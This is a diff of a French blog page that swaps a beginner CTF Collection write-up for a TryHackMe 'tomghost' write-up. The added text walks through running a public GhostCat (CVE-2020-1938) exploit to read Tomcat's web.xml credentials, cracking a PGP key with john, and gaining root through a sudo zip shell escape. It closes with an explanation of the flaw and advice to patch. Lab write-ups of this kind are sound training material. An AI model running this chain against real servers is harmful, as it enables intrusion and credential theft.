@@ -5,18 +5,18 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Ce write-up sera consacré à la room CTF collection Vol.1, qui est sur Try Hack Me. Cette box contient un certain nombre d&amp;rsquo;exercices dédiés aux débutants. Let&amp;rsquo;s go !
-Synopsis :
- Just another random CTF room created by me. Well, the main objective of the room is to test your CTF skills. For your information, vol.1 consists of 20 tasks and all the challenges are extremely easy. Stay calm and Capture the flag." />
+<meta name="description" content="Aujourd&amp;rsquo;hui, je m&amp;rsquo;attaque à la box tomghost, sur Try Hack Me. Le nom en dit long sur cette room :)
+Reconnaissance Je fais un nmap directement avec le flag --script vuln, car les tags de la room indiquent un numéro de CVE.
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |_clamav-exec: ERROR: Script execution failed (use -d to debug) 53/tcp open tcpwrapped |_clamav-exec: ERROR: Script execution failed (use -d to debug) 8009/tcp open ajp13 Apache Jserv (Protocol v1." />
 <meta name="keywords" content=", writeup, tryhackme" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="https://blog.hugoblanc.com/posts/ctf-collection-vol1/" />
+<link rel="canonical" href="https://blog.hugoblanc.com/posts/tomghost-writeup/" />
 
 
     <title>
         
-            Write-up | CTF Collection Vol.1 :: ezekiel&#39;s blog 
+            Write-up | Tomghost :: ezekiel&#39;s blog 
         
     </title>
 
@@ -34,13 +34,13 @@ Synopsis :
 
 
 
-<meta itemprop="name" content="Write-up | CTF Collection Vol.1">
-<meta itemprop="description" content="Ce write-up sera consacré à la room CTF collection Vol.1, qui est sur Try Hack Me. Cette box contient un certain nombre d&rsquo;exercices dédiés aux débutants. Let&rsquo;s go !
-Synopsis :
- Just another random CTF room created by me. Well, the main objective of the room is to test your CTF skills. For your information, vol.1 consists of 20 tasks and all the challenges are extremely easy. Stay calm and Capture the flag.">
-<meta itemprop="datePublished" content="2020-07-08T01:43:30&#43;02:00" />
-<meta itemprop="dateModified" content="2020-07-08T01:43:30&#43;02:00" />
-<meta itemprop="wordCount" content="819">
+<meta itemprop="name" content="Write-up | Tomghost">
+<meta itemprop="description" content="Aujourd&rsquo;hui, je m&rsquo;attaque à la box tomghost, sur Try Hack Me. Le nom en dit long sur cette room :)
+Reconnaissance Je fais un nmap directement avec le flag --script vuln, car les tags de la room indiquent un numéro de CVE.
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |_clamav-exec: ERROR: Script execution failed (use -d to debug) 53/tcp open tcpwrapped |_clamav-exec: ERROR: Script execution failed (use -d to debug) 8009/tcp open ajp13 Apache Jserv (Protocol v1.">
+<meta itemprop="datePublished" content="2020-07-08T14:50:53&#43;02:00" />
+<meta itemprop="dateModified" content="2020-07-08T14:50:53&#43;02:00" />
+<meta itemprop="wordCount" content="895">
 <meta itemprop="image" content="https://blog.hugoblanc.com/"/>
 
 
@@ -49,29 +49,29 @@ Synopsis :
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://blog.hugoblanc.com/"/>
 
-<meta name="twitter:title" content="Write-up | CTF Collection Vol.1"/>
-<meta name="twitter:description" content="Ce write-up sera consacré à la room CTF collection Vol.1, qui est sur Try Hack Me. Cette box contient un certain nombre d&rsquo;exercices dédiés aux débutants. Let&rsquo;s go !
-Synopsis :
- Just another random CTF room created by me. Well, the main objective of the room is to test your CTF skills. For your information, vol.1 consists of 20 tasks and all the challenges are extremely easy. Stay calm and Capture the flag."/>
+<meta name="twitter:title" content="Write-up | Tomghost"/>
+<meta name="twitter:description" content="Aujourd&rsquo;hui, je m&rsquo;attaque à la box tomghost, sur Try Hack Me. Le nom en dit long sur cette room :)
+Reconnaissance Je fais un nmap directement avec le flag --script vuln, car les tags de la room indiquent un numéro de CVE.
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |_clamav-exec: ERROR: Script execution failed (use -d to debug) 53/tcp open tcpwrapped |_clamav-exec: ERROR: Script execution failed (use -d to debug) 8009/tcp open ajp13 Apache Jserv (Protocol v1."/>
 
 
 
-    <meta property="og:title" content="Write-up | CTF Collection Vol.1" />
-<meta property="og:description" content="Ce write-up sera consacré à la room CTF collection Vol.1, qui est sur Try Hack Me. Cette box contient un certain nombre d&rsquo;exercices dédiés aux débutants. Let&rsquo;s go !
-Synopsis :
- Just another random CTF room created by me. Well, the main objective of the room is to test your CTF skills. For your information, vol.1 consists of 20 tasks and all the challenges are extremely easy. Stay calm and Capture the flag." />
+    <meta property="og:title" content="Write-up | Tomghost" />
+<meta property="og:description" content="Aujourd&rsquo;hui, je m&rsquo;attaque à la box tomghost, sur Try Hack Me. Le nom en dit long sur cette room :)
+Reconnaissance Je fais un nmap directement avec le flag --script vuln, car les tags de la room indiquent un numéro de CVE.
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |_clamav-exec: ERROR: Script execution failed (use -d to debug) 53/tcp open tcpwrapped |_clamav-exec: ERROR: Script execution failed (use -d to debug) 8009/tcp open ajp13 Apache Jserv (Protocol v1." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://blog.hugoblanc.com/posts/ctf-collection-vol1/" />
+<meta property="og:url" content="https://blog.hugoblanc.com/posts/tomghost-writeup/" />
 <meta property="og:image" content="https://blog.hugoblanc.com/"/>
-<meta property="article:published_time" content="2020-07-08T01:43:30+02:00" />
-<meta property="article:modified_time" content="2020-07-08T01:43:30+02:00" /><meta property="og:site_name" content="ezekiel&#39;s blog" />
+<meta property="article:published_time" content="2020-07-08T14:50:53+02:00" />
+<meta property="article:modified_time" content="2020-07-08T14:50:53+02:00" /><meta property="og:site_name" content="ezekiel&#39;s blog" />
 
 
 
 
 
 
-    <meta property="article:published_time" content="2020-07-08 01:43:30 &#43;0200 CEST" />
+    <meta property="article:published_time" content="2020-07-08 14:50:53 &#43;0200 CEST" />
 
 
 
@@ -137,7 +137,7 @@ Synopsis :
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        4 minutes
+        5 minutes
 
         
       </p>
@@ -145,97 +145,129 @@ Synopsis :
 
     <article>
       <h1 class="post-title">
-        <a href="https://blog.hugoblanc.com/posts/ctf-collection-vol1/">Write-up | CTF Collection Vol.1</a>
+        <a href="https://blog.hugoblanc.com/posts/tomghost-writeup/">Write-up | Tomghost</a>
       </h1>
 
       
 
       <div class="post-content">
-        <p>Ce write-up sera consacré à la room CTF collection Vol.1, qui est sur <a href="https://tryhackme.org">Try Hack Me</a>.
-Cette box contient un certain nombre d&rsquo;exercices dédiés aux débutants. Let&rsquo;s go !</p>
-<p>Synopsis :</p>
+        <p>Aujourd&rsquo;hui, je m&rsquo;attaque à la box tomghost, sur <a href="https://tryhackme.com">Try Hack Me</a>. Le nom en dit long sur cette room :)</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Je fais un <code>nmap</code> directement avec le flag <code>--script vuln</code>, car les tags de la room indiquent un numéro de CVE.</p>
+<pre><code>PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+53/tcp   open  tcpwrapped
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+8080/tcp open  http       Apache Tomcat 9.0.30
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /examples/: Sample scripts
+|_  /docs/: Potentially interesting folder
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+| vulners: 
+|   cpe:/a:apache:tomcat:9.0.30: 
+|       CVE-2020-1938   7.5     https://vulners.com/cve/CVE-2020-1938
+|       CVE-2020-1935   5.8     https://vulners.com/cve/CVE-2020-1935
+|       CVE-2019-17569  5.8     https://vulners.com/cve/CVE-2019-17569
+|       CVE-2020-1745   5.0     https://vulners.com/cve/CVE-2020-1745
+|       CVE-2020-11996  5.0     https://vulners.com/cve/CVE-2020-11996
+|_      CVE-2020-9484   4.4     https://vulners.com/cve/CVE-2020-9484
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Comme le nom de la machine laissait imaginer, on va devoir exploiter une vulnérabilité de Apache Tomcat, la CVE-2020-1938, également appelée GhostCat.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Afin de pouvoir exploiter cette vulnérabilité, le port AJP (8009) doit être ouvert, ce qui est le cas ici.</p>
+<p>Il ne semble y avoir aucun <em>exploit</em> sur metasploit permettant d&rsquo;exploiter cette vulnérabilité. Il va donc falloir en trouver un sur le net. Heureusement, de nombreuses PoC sont disponibles sur GitHub. J&rsquo;utilise celui de  <a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">00theway</a>.</p>
+<p>Les serveurs Apache Tomcat ont par défaut un fichier <code>/WEB-INF/web.xml</code>. Je lance donc l&rsquo;<em>exploit</em> pour lire ce fichier :</p>
+<pre><code>$ python3 exploit.py http://10.10.201.10:8080 8009 /WEB-INF/web.xml read
+...
+&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
+  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee
+                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
+  version=&quot;4.0&quot;
+  metadata-complete=&quot;true&quot;&gt;
+
+  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
+  &lt;description&gt;
+     Welcome to GhostCat
+        skyfuck:[edited]
+  &lt;/description&gt;
+
+&lt;/web-app&gt;
+</code></pre><p>On retrouve sur cette page des identifiants. Je les teste donc en SSH, et ça marche !</p>
+<p>Une fois connecté, je vois qu&rsquo;il y a 2 fichiers dans le home dir de l&rsquo;user : <code>credential.pgp</code> et <code>tryhackme.asc</code>.</p>
+<ul>
+<li><code>tryhackme.asc</code> contient une clé privée PGP.</li>
+<li><code>credentials.pgp</code> est un fichier binaire.</li>
+</ul>
+<p>Je les récupère donc sur ma machine pour jouer avec :</p>
+<pre><code>$ scp skyfuck@10.10.201.10:/home/skyfuck/* Documents/tryhackme/tomghost/
+skyfuck@10.10.201.10's password: 
+credential.pgp        100%  394     6.8KB/s   00:00    
+tryhackme.asc         100% 5144    90.1KB/s   00:00
+</code></pre><p>J&rsquo;essaie d&rsquo;importer avec <code>gpg</code>, mais je n&rsquo;ai pas le mot de passe. Qui on appelle quand il est question de craquer des clés ? <code>john</code> !</p>
+<pre><code>$ sudo gpg2john tryhackme.asc &gt; hash
+
+File tryhackme.asc
+
+$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+...
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[edited]        (tryhackme)
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Yes ! Ça fonctionne ! Je peux alors utiliser <code>gpg</code> :</p>
+<pre><code>$ gpg --decrypt credential.pgp 
+gpg: Attention : l'algorithme de chiffrement CAST5 est introuvable
+            dans les préférences du destinataire
+gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
+      « tryhackme &lt;stuxnet@tryhackme.com&gt; »
+merlin:[edited]
+</code></pre><p>Il y a donc un autre utilisateur sur la machine que <code>skyfuck</code>, je n&rsquo;avais pas pensé à regarder ! Ces identifiants me permettent de me connecter en SSH entant que <code>merlin</code>. Je peux alors lire le flag <code>user.txt</code> :</p>
+<pre><code>$ cat user.txt 
+THM{[edited]}
+</code></pre><h2 id="élévation-de-privilèges">Élévation de privilèges</h2>
+<p>Afin de voir comment je pourrais passer root, j&rsquo;essaie d&rsquo;abord <code>sudo -l</code> :</p>
+<pre><code>User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+</code></pre><p>Hmm, étrange&hellip;
+Un petit tour sur <a href="https://gtfobins.github.io/">GTFOBins</a> pour voir ce qu&rsquo;il est possible de faire avec <code>zip</code> :</p>
 <blockquote>
-<p>Just another random CTF room created by me. Well, the main objective of the room is to test your CTF skills. For your information, vol.1 consists of 20 tasks and all the challenges are extremely easy. Stay calm and Capture the flag. :)</p>
+<p>It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.</p>
 </blockquote>
-<h2 id="what-does-the-base-said">What does the base said?</h2>
-<p>Dans cet exo, il faut simplement décoder une chaine de caractère qui semble être encodée en base64.</p>
-<pre><code>$ echo &quot;VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==&quot; | base64 -d
-THM{[edited]}
-</code></pre><h2 id="meta-meta">Meta meta</h2>
-<p>Ici, il faut juste regarder les métadonnées de l&rsquo;image à télécharger, je ne vais pas plus détailler :)</p>
-<h2 id="mon-are-we-going-to-be-okay">Mon, are we going to be okay?</h2>
-<p>Petit challenge de stégano, on trouve le contenu de l&rsquo;image avec <code>steghide</code>:</p>
-<pre><code>$ steghide extract -sf Extinction.jpg 
-Entrez la passphrase: 
-Écriture des donnÉes extraites dans &quot;Final_message.txt&quot;.
-$ cat Final_message.txt 
-It going to be over soon. Sleep my child.
+<p>Parfait :)</p>
+<pre><code>$ TF=$(mktemp -u)
+$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 31%)
 
+# whoami
+root
+# cat /root/root.txt
 THM{[edited]}
-</code></pre><p>(C&rsquo;est le chall le plus déprimant que j&rsquo;ai fait de ma vie&hellip; ).</p>
-<h2 id="ermmagick">Erm&hellip;&hellip;Magick</h2>
-<p>Cette tâche se résoud directement en regardant son code source sur le navigateur, pas besoin d&rsquo;en dire plus ;)</p>
-<h2 id="qrrrrr">QRrrrr</h2>
-<p>Ici, un simple QR code à télécharger et à scanner avec son téléphone.</p>
-<h2 id="reverse-it-or-read-it">Reverse it or read it?</h2>
-<p>Dans cet exercice, on récupère un fichier binaire appelé <code>hello.hello</code>. Il existe sous Linux une commande permettant d&rsquo;extraire les chaines de caractères lisibles d&rsquo;un binaire. Cette commande est <code>strings</code>. Ainsi, on peut faire :</p>
-<pre><code>$ strings hello.hello | grep THM
-THM{[edited]}
-</code></pre><h2 id="another-decoding-stuff">Another decoding stuff</h2>
-<p>Ici, nous avons seulement une chaine de caractère codée.
-Je la passe dans <code>hash-identifier</code>, mais aucun format de hash n&rsquo;est reconnu. C&rsquo;est probablement un codage sur une base différente du base64. Un petit tour sur <a href="https://gchq.github.io/CyberChef/">CyberChef</a> et on découvre que c&rsquo;est du base58.</p>
-<h2 id="left-or-right">Left or right</h2>
-<p>L&rsquo;énoncé nous donne <code>MAF{atbe_max_vtxltk}</code>. Ce n&rsquo;est probablement pas du ROT13.
-Je vais sur <a href="https://www.dcode.fr">dcode.fr</a> afin de trouver le décalage du code César. On trouve ainsi le flag.</p>
-<h2 id="make-a-comment">Make a comment</h2>
-<p>Aucun document ou string n&rsquo;est donné. Le chall s&rsquo;appellant Make a comment, je regarde le code source et&hellip; Oh bah tiens :)</p>
-<h2 id="can-you-fix-it">Can you fix it?</h2>
-<p>On voit en regardant le header du fichier .png à télécharger que les 8 premiers octets ne sont pas les bons. Avec <code>hexeditor</code>, on peut les modifier pour qu&rsquo;ils correspondent à <code>89 50 4e 47 0d 0a 1a 0a</code>. L&rsquo;image est maintenant lisible est contient le flag.</p>
-<h2 id="read-it">Read it</h2>
-<blockquote>
-<p>Some hidden flag inside Tryhackme social account.</p>
-</blockquote>
-<p>Un exo d&rsquo;OSINT ? Chouette ! Il va falloir aller stalker les réseaux sociaux de TryHackMe !
-Le flag se trouve sur reddit assez facilement !</p>
-<h2 id="spin-my-head">Spin my head</h2>
-<p>Le format de la chaine de caractères donnée est du brainfuck. <a href="https://www.dcode.fr">dcode.fr</a> a tous les outils nécessaires pour la décoder et obtenir le flag.</p>
-<h2 id="an-exclusive">An exclusive!</h2>
-<p>Pour résoudre celui-là, il faut faire un XOR entre <code>44585d6b2368737c65252166234f20626d</code> et  <code>1010101010101010101010101010101010</code>. Je suis passé par <a href="https://wor.pw">xor.pw</a> car il permet d&rsquo;afficher la sortie en ASCII.</p>
-<h2 id="binary-walk">Binary Walk</h2>
-<p>Après avoir récupéré l&rsquo;image, on utilise <code>binwalk</code> pour voir si il y a du contenu caché à l&rsquo;intérieur :</p>
-<pre><code>$ binwalk hell.jpg 
-
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-0             0x0             JPEG image data, JFIF standard 1.02
-30            0x1E            TIFF image data, big-endian, offset of first image directory: 8
-265845        0x40E75         Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt
-266099        0x40F73         End of Zip archive, footer length: 22
-</code></pre><p>On voit que c&rsquo;est le cas, on peut alors utiliser le flag <code>--extract</code> pour extraire <code>hello_there.txt</code>, puis le lire :</p>
-<pre><code>$ cat _hell.jpg.extracted/hello_there.txt 
-Thank you for extracting me, you are the best!
-
-THM{[edited]}
-</code></pre><h2 id="darkness">Darkness</h2>
-<p>L&rsquo;aide du challenge conseille d&rsquo;utiliser <code>stegsolve</code>, outil que je n&rsquo;ai pas.
-Il est possible de le récupérer comme ça :</p>
-<pre><code>wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
-chmod +x stegsolve.jar
-</code></pre><p>puis de l&rsquo;utiliser comme ceci : <code>java -jar stegsolve.jar</code>.
-En jouant un peu avec les options, on voit le flag apparaitre.</p>
-<h2 id="a-sounding-qr">A sounding QR</h2>
-<p>Un QR à scanner donne un lien vers soundcloud. En écoutant le fichier, on comprends le flag. Il est possible de l&rsquo;enregistrer et de l&rsquo;écouter plus lentement ;)</p>
-<h2 id="dig-up-the-past">Dig up the past</h2>
-<p>Celui-là est sympa, il faut utiliser la Wayback Machine.</p>
-<h2 id="uncrackable-">Uncrackable !</h2>
-<p>On dirait du chiffrement par décalage; ayant déjà eu du code César, je pencherai cette fois-ci pour du chiffre de Vigenère.
-Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a> et le tour est joué.</p>
-<h2 id="small-bases">Small bases</h2>
-<p>Pour trouver le flag de cet exo, il faut convertir la string de la base décimale à l&rsquo;hexa, puis de l&rsquo;hexa à l&rsquo;ASCII</p>
-<h2 id="read-the-packet">Read the packet</h2>
-<p>Ici j&rsquo;ai ouvert la capture avec <code>Wireshark</code>, et j&rsquo;ai cherché la string contant &lsquo;THM&rsquo;.</p>
-<h3 id="le-mot-de-la-fin">Le mot de la fin</h3>
-<p>Voilà cette room terminée ! Elle aura été assez longue. Même si elle n&rsquo;a pas été aussi sympa qu&rsquo;un CTF plus classique, elle m&rsquo;a permit de revoir quelques bases et quelques outils que je n&rsquo;ai pas l&rsquo;habitude d&rsquo;utiliser.</p>
+</code></pre><p>:)</p>
+<h2 id="épilogue--un-point-sur-apache-tomcat-et-la-vulnérabilité-ghostcat">Épilogue : un point sur Apache Tomcat et la vulnérabilité GhostCat</h2>
+<p>Apache Tomcat est un serveur web qui permet d&rsquo;exécuter des applications faites en Java (.jsp&hellip;).</p>
+<p>Dans cette room, j&rsquo;ai exploité le protocole AJP qui est de base sur le port 8009. AJP (pour Apache JServ Protocol) permet la communication entre un serveur web Apache (qui reçoit les requêtes HTTP) et un serveur Tomcat (qui gère les applications Java). Le serveur Apache traduit les requêtes HTTP en requêtes AJP pour que Tomcat puisse les interpréter.</p>
+<p>Le problème ici est que le port sur lequel tourne AJP est visible de l&rsquo;extérieur. Or, le serveur Tomcat considère toutes les requêtes AJP comme étant légitimes. Dans ces requêtes, il y a un champ URI qui contient une chaine de caractères entrée par l&rsquo;utilisateur. Les requêtes AJP étant considérées comme sûres par Tomcat, ce champ n&rsquo;est pas controllé, ce qui permet à un attaquant de lire ou écrire des fichiers déjà présent sur le serveur. C&rsquo;est ce que j&rsquo;ai fait ici, en lisant le fichier <code>/WEB-INF/web.xml</code>.</p>
+<p>Aujourd&rsquo;hui, cette vulnérabilité est patchée, donc les mises à jour suffisent à éviter ce problème. Cependant, Apache Tomcat a de nombreuses vulnérabilités qui sont découvertes chaque année, et beaucoup d&rsquo;entre elles sont faciles à exploiter, les <em>exploits</em> étant publics :</p>
+<pre><code>$ searchsploit tomcat | wc -l
+68
+</code></pre><p>Morale de l&rsquo;histoire : faites vos mises à jour et utilisez des pare-feux :)</p>
 
       </div>
     </article>
@@ -258,7 +290,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        819 Words
+        895 Words
       </p>
 
       <p>
@@ -268,13 +300,13 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
           <line x1="8" y1="2" x2="8" y2="6"></line>
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
-        2020-07-08 01:43 &#43;0200
+        2020-07-08 14:50 &#43;0200
       </p>
     </div>
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -282,7 +314,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
@@ -291,7 +323,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Write-up%20%7c%20CTF%20Collection%20Vol.1&amp;caption=Write-up%20%7c%20CTF%20Collection%20Vol.1&amp;canonicalUrl=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Write-up%20%7c%20Tomghost&amp;caption=Write-up%20%7c%20Tomghost&amp;canonicalUrl=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -300,7 +332,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=Write-up%20%7c%20CTF%20Collection%20Vol.1&amp;body=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=Write-up%20%7c%20Tomghost&amp;body=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -308,7 +340,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f&amp;media=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f;description=Write-up%20%7c%20CTF%20Collection%20Vol.1" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f&amp;media=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f;description=Write-up%20%7c%20Tomghost" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -316,7 +348,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f&amp;title=Write-up%20%7c%20CTF%20Collection%20Vol.1&amp;summary=Write-up%20%7c%20CTF%20Collection%20Vol.1&amp;source=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
